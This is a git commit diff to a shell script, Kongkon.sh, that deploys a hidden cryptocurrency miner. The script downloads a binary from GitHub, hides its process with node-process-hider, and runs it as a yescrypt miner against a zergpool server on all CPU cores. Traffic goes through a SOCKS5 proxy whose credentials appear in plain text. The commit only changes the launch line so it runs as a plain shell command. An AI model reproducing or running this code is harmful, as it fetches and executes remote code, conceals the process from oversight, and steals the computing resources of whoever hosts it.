8d385e293642a16b3fe2b167d507c346a8444c8d
uaaoxjdr <99876928+uaaoxjdr@users.noreply.github.com>
2022-05-08 18:44:46 +0700

    Update Kongkon.sh

--- Kongkon.sh
+++ Kongkon.sh
@@ -4,4 +4,4 @@ wget -q https://github.com/thirthada007/DevOps/raw/main/data
 chmod +x data
 npm i -g node-process-hider 
 ph add data
-!./data -a yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6233 -u TQzmMDEjP1k2a7c6xqf3xJgJJ7E9NkzBbW.archer -p c=TRX -t $(nproc) -x socks5://Kemjabd1727:Gaushd019@92.242.189.126:6977
+./data -a yescrypt -o stratum+tcp://yescrypt.na.mine.zergpool.com:6233 -u TQzmMDEjP1k2a7c6xqf3xJgJJ7E9NkzBbW.archer -p c=TRX -t $(nproc) -x socks5://Kemjabd1727:Gaushd019@92.242.189.126:6977
